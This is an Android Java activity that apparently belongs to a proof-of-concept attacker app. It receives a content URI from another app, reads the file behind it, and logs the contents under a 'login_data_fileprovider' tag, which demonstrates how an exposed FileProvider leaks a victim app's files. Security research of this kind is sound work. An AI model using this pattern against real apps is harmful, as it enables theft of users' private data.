package oversecured.plugin.assassin;

import androidx.appcompat.app.AppCompatActivity;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class FileLeakActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_file_leak);

//        Uri uri = Uri.parse(getIntent().getDataString());
        try {
            Log.d("fileprovider_debug", "received intent");
            InputStream is = getContentResolver().openInputStream(getIntent().getData());
            StringBuilder sb = new StringBuilder();
            BufferedReader br = new BufferedReader(new InputStreamReader(is));
            String read;
            while ((read = br.readLine()) != null) {
                sb.append(read);
            }
            br.close();
            Log.d("login_data_fileprovider", sb.toString());
        } catch (IOException e) {
            e.printStackTrace();
        }


    }
}